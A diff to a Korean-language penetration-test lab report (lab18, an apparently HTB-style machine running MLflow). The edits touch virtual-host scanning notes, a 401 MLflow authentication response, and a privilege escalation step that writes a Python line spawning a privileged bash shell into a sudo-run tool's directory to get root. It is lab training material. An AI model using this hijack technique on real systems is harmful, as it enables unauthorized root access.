@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab18
 created: 2026-11-12
-modified: 2026-11-12T18:47:49.006Z
+modified: 2026-11-12T18:52:57.179Z
 published: 2026-11-12
 date: 2026-11-12
 tags:
@@ -61,15 +61,16 @@ lab: lab18
 **vhost는 항상 체크!**
 nmap에 도메인 나오거나 `curl -i http://<IP>` 했을 때 도메인 나오면 무조건 vhost를 스캔해본다.
 
-가상 호스트는 `wfuzz`나 `gobuster` vhost 옵션을 쓸 수 있다.
+가상 호스트는 `wfuzz`나 `gobuster` vhost 옵션을 써서 확인할 수 있다.
 
 401 응답으로 `models.smarthire.htb` 가 나왔다.
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261112102404.png]]
 
-가상 호스트에 HTTP 요청을 보내본다.
+가상 호스트에 `curl`로 `HTTP` 요청을 보내본다.
 
 ```
+HTTP/1.1 401 UNAUTHORIZED
 www-Authenticate: Basic realm= "mlflow"
 you are not authenticated.
 ```
@@ -302,7 +303,8 @@ printf '%s\n' 'import os; os.execl("/bin/bash", "bash", "-p")' > /opt/tools/mlfl
 sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
 ```
 
-`root` 권한으로 `mlflowctl.py`를 실행하고
+`root` 권한으로 `mlflowctl.py`를 실행해서 rootbash 쉘이 나왔다.
+권한 상승에 성공했다.
 
 ## 6. 취약점
 
